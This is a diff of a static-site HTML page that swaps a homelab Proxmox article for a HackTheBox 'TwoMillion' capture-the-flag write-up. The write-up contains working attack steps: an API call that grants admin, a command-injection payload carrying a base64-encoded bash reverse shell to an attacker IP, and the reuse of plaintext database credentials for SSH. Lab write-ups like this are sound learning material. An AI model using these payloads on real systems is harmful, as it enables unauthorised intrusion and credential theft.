 </li>
       
         <li class="md-nav__item">
-  <a href="#administration" class="md-nav__link">
+  <a href="#api-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Administration
+        API Enumeration
       
     </span>
   </a>
@@ -4103,10 +4183,32 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#reflections" class="md-nav__link">
+  <a href="#privilege-escalation-to-admin" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Reflections
+        Privilege Escalation to Admin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold — Command Injection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-www-data-to-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement — www-data to admin
       
     </span>
   </a>
@@ -4138,7 +4240,7 @@
   
   
     <li class="md-path__item">
-      <a href="../.." class="md-path__link">
+      <a href="../../.." class="md-path__link">
         
   <span class="md-ellipsis">
     Home
@@ -4156,10 +4258,28 @@
     
     
       <li class="md-path__item">
+        <a href="../../overview/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
         <a href="../overview/" class="md-path__link">
           
   <span class="md-ellipsis">
-    Homelab
+    HTB
   </span>
 
         </a>
@@ -4178,58 +4298,271 @@
 
 
 
-<h1 id="proxmox-hypervisor">Proxmox Hypervisor</h1>
-<p>I run my homelab on a single Proxmox hypervisor. 
-It’s not glamorous, but it works, 
-and that balance between budget, efficiency, 
-and ambition feels a lot like running a small company. 
-Every decision costs something, and I have to make it count.</p>
-<h2 id="why-proxmox">Why Proxmox?</h2>
-<p>When I started, I knew I didn’t want to base my lab on Windows. 
-My goal is to live in a Linux world, 
-and Proxmox gave me a way to build on that foundation. 
-It’s open-source, free for my use case, and backed by a strong community. 
-More importantly: it forced me to <em>choose</em>. 
-At some point you stop researching and commit to a tool, and Proxmox became mine.</p>
-<h2 id="hardware">Hardware</h2>
+<h1 id="twomillion">TwoMillion</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>OS</strong></td>
+<td>Linux</td>
+</tr>
+<tr>
+<td><strong>Release</strong></td>
+<td>HTB 2 Million User Celebration</td>
+</tr>
+</tbody>
+</table>
+<p>HTB made this box to celebrate hitting 2 million users.
+The twist: it runs an old version of the HackTheBox platform itself.
+That means the target is a familiar face — but with old wounds that were long since patched on the real site.</p>
+<p>The attack chain runs through the invite system, into the API, up to admin, and then out through the kernel.</p>
+<hr />
+<h2 id="setup">Setup</h2>
+<p>I run a Kali VM via QEMU on my Arch laptop.
+I keep things separated on purpose — HTB is not logged in on the VM itself.
+That means I need to get the VPN config file over to the VM another way.</p>
+<p>The easiest solution: spin up a quick HTTP server on the host from the folder where the OVPN file lives.</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
+<p>Then on the Kali VM, pull it down with curl:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://192.168.122.1:8000/machines_eu-4.ovpn<span class="w"> </span>-o<span class="w"> </span>machines_eu-4.ovpn
+</code></pre></div>
+<p>After that, connecting to the box is just:</p>
+<div class="highlight"><pre><span></span><code>openvpn<span class="w"> </span>machines_eu-4.ovpn
+</code></pre></div>
+<p>Simple, clean, and I never have to touch the browser on the VM.</p>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<p>First things first — make sure I can actually reach the box.</p>
+<div class="highlight"><pre><span></span><code>ping<span class="w"> </span><span class="m">10</span>.129.23.158
+</code></pre></div>
+<p>Two packets out, two back. I am on the right network.</p>
+<p>Next a classic nmap scan. Scripts and version detection to get as much information as possible in one go.</p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.23.158
+</code></pre></div>
+<p>Two ports open:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 8.9p1 Ubuntu</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>nginx, redirecting to <code>http://2million.htb/</code></td>
+</tr>
+</tbody>
+</table>
+<p>The HTTP redirect already hands me the hostname the server expects.
+Without that in my hosts file, the proxy won't serve me the right page.
+So I add it:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.129.23.158 2million.htb&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</code></pre></div>
+<p>Now <code>2million.htb</code> resolves locally and I can open the site in the browser.</p>
+<h3 id="mtu-troubleshooting">MTU Troubleshooting</h3>
+<p>Except it didn't load. Not in Firefox, not in Chromium, not in curl.
+Ping worked fine. The TCP handshake went through. But curl just sat there after sending the request and never got anything back.</p>
+<p>After a box reset, a new IP, and a fresh VPN connection — same result.</p>
+<p>The culprit turned out to be an MTU mismatch.
+The VPN tunnel adds its own headers on top of every packet, which means the real usable packet size through <code>tun0</code> is smaller than the default 1500 bytes.
+Small packets — like ICMP for ping, or the TCP SYN/ACK for the handshake — fit through fine.
+But the HTTP response, even just the headers, is large enough to get silently dropped.</p>
+<p>To confirm, test with a large forced packet:</p>
+<div class="highlight"><pre><span></span><code>ping<span class="w"> </span>-M<span class="w"> </span><span class="k">do</span><span class="w"> </span>-s<span class="w"> </span><span class="m">1450</span><span class="w"> </span>2million.htb
+</code></pre></div>
+<p>If that fails while a normal ping works, the MTU is the problem. Fix it by lowering the MTU on the tunnel interface:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>tun0<span class="w"> </span>mtu<span class="w"> </span><span class="m">1200</span>
+</code></pre></div>
+<p>After that, curl responded immediately and the site loaded.</p>
+<hr />
+<h2 id="the-website">The Website</h2>
+<p>Landing on <code>2million.htb</code> feels immediately familiar — it is a recreation of an old version of the HackTheBox platform.</p>
+<p>Two paths stand out right away:</p>
 <ul>
-<li><strong>CPU</strong>: Intel N95, 4 cores @ 3.40GHz  </li>
-<li><strong>RAM</strong>: 16GB  </li>
+<li><code>2million.htb/login</code> — a standard login form</li>
+<li><code>2million.htb/invite</code> — a registration page that requires an invite code</li>
 </ul>
-<p>Nothing fancy, but it’s more than enough to virtualize multiple systems at once. 
-I’m still amazed at how much I can run on this single box.</p>
-<h2 id="networking">Networking</h2>
-<p>One of the decisions I’m proud of was giving this machine dual physical NICs. 
-I wanted WAN and LAN to be separated in hardware, not just in configuration. 
-Proxmox itself doesn’t touch those NICs directly, 
-but instead, I pass them through via PCI passthrough to my pfSense VM. 
-Proxmox lives on a virtual NIC connected to the LAN side, 
-which keeps management traffic isolated and feels like a proper enterprise setup.</p>
-<h2 id="administration">Administration</h2>
-<p>My administrative practices are still developing, 
-but I already try to keep things disciplined:</p>
+<p>The invite page doesn't just ask for a code.
+It specifically calls out that curious users are welcome to hack their way through.
+That is a green light.</p>
+<hr />
+<h2 id="hacking-the-invite-code">Hacking the Invite Code</h2>
+<p>Looking at the page source, one JavaScript file stands out: <code>http://2million.htb/js/inviteapi.min.js</code>.
+It is minified and obfuscated, so I ran it through ChatGPT to get something readable.</p>
+<p>What came out were two functions making API calls:</p>
 <ul>
-<li>
-<p><strong>Snapshots</strong>: I take weekly snapshots of the important VMs. 
-                 Nothing changes much week to week, so this keeps me covered.  </p>
-</li>
-<li>
-<p><strong>Backups</strong>: I’m still working on a real backup strategy. 
-               Snapshots are not backups, and I know I need more resilience.  </p>
-</li>
-<li>
-<p><strong>Philosophy</strong>: Virtualization-first. 
-                  No single-use machines, no hardware locked into one function 
-                  if I can help it.  </p>
-</li>
+<li><code>verifyInviteCode</code> — POSTs to <code>/api/v1/invite/verify</code></li>
+<li><code>makeInviteCode</code> — POSTs to <code>/api/v1/invite/how/to/generate</code></li>
 </ul>
-<h2 id="reflections">Reflections</h2>
-<p>This setup is both a struggle and a triumph. 
-On one hand, everything rests on a single box, 
-but if it goes down, my entire lab goes dark. 
-On the other, the fact that this one little machine can run so much is incredible. 
-It’s taught me to think like a business: 
-stretch every resource, make trade-offs, and keep moving forward.</p>
+<p>That second one is interesting. An endpoint that tells me how to generate a code.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sX<span class="w"> </span>POST<span class="w"> </span>http://2million.htb/api/v1/invite/how/to/generate<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+</code></pre></div>
+<p>The response came back with an encrypted hint and helpfully told me the encryption type: ROT13.</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;enctype&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ROT13&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Decoded with CyberChef:</p>
+<blockquote>
+<p><em>In order to generate the invite code, make a POST request to /api/v1/invite/generate</em></p>
+</blockquote>
+<p>So I did exactly that:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sX<span class="w"> </span>POST<span class="w"> </span>http://2million.htb/api/v1/invite/generate<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+</code></pre></div>
+<p>The response gave me a base64 encoded invite code:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;M1JDMVItWTFVOTUtTEtGR0ctMTRKSU0=&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;format&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;encoded&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Decoded from base64 and used it to register an account on the platform.
+In.</p>
+<hr />
+<h2 id="api-enumeration">API Enumeration</h2>
+<p>Once inside, the site itself didn't give much away.
+But there was an access page that generates an OVPN file for your account.
+The URL structure looked exactly like the invite code API — same schema, same pattern.
+That gave me the idea: just try hitting <code>/api/v1</code> directly with my session cookie and see what comes back.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>http://2million.htb/api/v1<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: PHPSESSID=4a0qlsqfadmbrm5cj2nf6pq5ii&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+</code></pre></div>
+<p>The API handed me the full route list without any fuss.
+Most interesting was the admin section:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Endpoint</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td><code>/api/v1/admin/auth</code></td>
+<td>Check if user is admin</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/api/v1/admin/vpn/generate</code></td>
+<td>Generate VPN for specific user</td>
+</tr>
+<tr>
+<td>PUT</td>
+<td><code>/api/v1/admin/settings/update</code></td>
+<td>Update user settings</td>
+</tr>
+</tbody>
+</table>
+<p>I am not admin. But there is an endpoint that updates user settings.
+That is worth pushing on.</p>
+<hr />
+<h2 id="privilege-escalation-to-admin">Privilege Escalation to Admin</h2>
+<p>First I poked at the admin endpoints to understand what they wanted.</p>
+<p>GET on <code>/api/v1/admin/auth</code> confirmed I was not admin.
+GET on <code>/api/v1/admin/vpn/generate</code> returned <code>405 Method Not Allowed</code> — it wants POST.
+POST on <code>/api/v1/admin/vpn/generate</code> returned <code>401 Unauthorized</code> — needs admin first.</p>
+<p>So the path was clear: use the settings update endpoint to make myself admin.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://2million.htb/api/v1/admin/settings/update<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: PHPSESSID=4a0qlsqfadmbrm5cj2nf6pq5ii&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+</code></pre></div>
+<p><code>Invalid content type.</code> — it wants JSON.</p>
+<p>Here I made my first mistake: I put the <code>Content-Type</code> header into the same <code>-H</code> string as the cookie, separated by a backslash. That merged them into one broken header, which invalidated my session entirely and got me a <code>401</code>. Worth knowing — curl takes one <code>-H</code> per header.</p>
+<p>With that fixed:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://2million.htb/api/v1/admin/settings/update<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: PHPSESSID=4a0qlsqfadmbrm5cj2nf6pq5ii&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
+</code></pre></div>
+<p><code>Missing parameter: email</code> — progress.</p>
+<p>Then I hit my second mistake: I used <code>-data</code> instead of <code>--data</code>. curl treated the value as a URL and threw <code>Bad hostname</code>. One extra dash fixed it.</p>
+<div class="highlight"><pre><span></span><code>--data<span class="w"> </span><span class="s1">&#39;{&quot;email&quot;:&quot;test@mail.com&quot;}&#39;</span>
+</code></pre></div>
+<p><code>Missing parameter: is_admin</code> — getting closer.</p>
+<p>Then I spent a few attempts figuring out what format <code>is_admin</code> actually wanted.
+<code>"true"</code> — no. <code>"1"</code> — no. <code>true</code> — no.
+The error was consistent: <em>Variable is_admin needs to be either 0 or 1.</em></p>
+<p>The trick was that it wanted an actual integer, not a JSON string.
+The way to get that through the shell quotes was:</p>
+<div class="highlight"><pre><span></span><code>--data<span class="w"> </span><span class="s1">&#39;{&quot;email&quot;:&quot;test@mail.com&quot;, &quot;is_admin&quot;:&#39;</span><span class="m">1</span><span class="s1">&#39;}&#39;</span>
+</code></pre></div>
+<p>The shell treats <code>'1'</code> outside the single-quoted block as a bare unquoted <code>1</code>, so the final JSON body becomes <code>{"email":"test@mail.com", "is_admin":1}</code> — a proper integer.</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">13</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;test&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;is_admin&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Confirmed with a GET to <code>/api/v1/admin/auth</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Admin.</p>
+<hr />
+<h2 id="foothold-command-injection">Foothold — Command Injection</h2>
+<p>With admin access, the VPN generate endpoint becomes interesting again.
+It takes a username and presumably passes it to some shell command server-side to build the config.
+If that input is not sanitised, I can break out of it.</p>
+<p>The classic test: append a semicolon and a command after the username.</p>
+<p>First I set up a listener on my machine:</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">1234</span>
+</code></pre></div>
+<p>Then I crafted the injection. The reverse shell payload base64-encoded keeps it clean and avoids any quoting issues:</p>
+<div class="highlight"><pre><span></span><code>bash -i &gt;&amp; /dev/tcp/10.10.14.212/1234 0&gt;&amp;1
+</code></pre></div>
+<p>Encoded:</p>
+<div class="highlight"><pre><span></span><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTIvMTIzNCAwPiYx
+</code></pre></div>
+<p>Sent it in the username field:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://2million.htb/api/v1/admin/vpn/generate<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: PHPSESSID=0a2fsrqpafmp11t85rk0vbdlgr&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--data<span class="w"> </span><span class="s1">&#39;{&quot;username&quot;:&quot;test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTIvMTIzNCAwPiYx | base64 -d | bash;&quot;}&#39;</span>
+</code></pre></div>
+<p>The listener caught the connection:</p>
+<div class="highlight"><pre><span></span><code>connect to [10.10.14.212] from 2million.htb [10.129.27.82] 38028
+www-data@2million:~/html$
+</code></pre></div>
+<p>Shell as <code>www-data</code>.</p>
+<hr />
+<h2 id="lateral-movement-www-data-to-admin">Lateral Movement — www-data to admin</h2>
+<p>From the web root, an <code>.env</code> file was sitting in plain sight:</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>.env
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+</code></pre></div>
+<p>Database credentials. But the real question is always: did someone reuse this password somewhere else?</p>
+<p>One SSH attempt later:</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>admin@2million.htb
+</code></pre></div>
+<p>They did.</p>
+<div class="highlight"><pre><span></span><code>admin@2million:~$ cat user.txt
+f30345b83af49629a0ff686124c80b8a
+</code></pre></div>
+<!-- f30345b83af49629a0ff686124c80b8a -->
+
+<p><strong>User flag captured.</strong></p>
 
 
 
@@ -4285,13 +4618,13 @@ stretch every resource, make trade-offs, and keep moving forward.</p>
         
         
           
-          <a href="../pfsense/" class="md-footer__link md-footer__link--next" aria-label="Next: pfSense">
+          <a href="../../thm/overview/" class="md-footer__link md-footer__link--next" aria-label="Next: Overview">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                pfSense
+                Overview
               </div>
             </div>
             <div class="md-footer__button md-icon">
@@ -4341,10 +4674,10 @@ stretch every resource, make trade-offs, and keep moving forward.</p>
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.top", "navigation.footer", "search.suggest"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.tabs", "navigation.path", "navigation.top", "navigation.footer", "search.suggest"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
